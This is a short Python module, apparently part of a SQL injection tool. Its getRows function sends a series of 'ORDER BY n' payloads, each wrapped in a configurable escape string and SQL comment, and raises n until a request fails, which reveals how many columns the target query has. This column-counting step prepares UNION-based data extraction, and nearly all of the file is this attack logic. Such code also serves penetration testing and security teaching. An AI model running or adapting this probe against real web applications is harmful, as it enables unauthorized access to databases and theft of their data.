

from req_ import req
from re import search
from checkRequest_ import checkRequest

def getRows(body, config):

	dbms = config['dbms']
	escape = config['escape']
	comment = config['comment']

	rows = 1

	while 1==1:

		payload = '{} ORDER BY {} {}'.format(escape, rows, comment)

		if checkRequest(body, config, payload) == False:
			return rows - 1
			break
			
		rows += 1




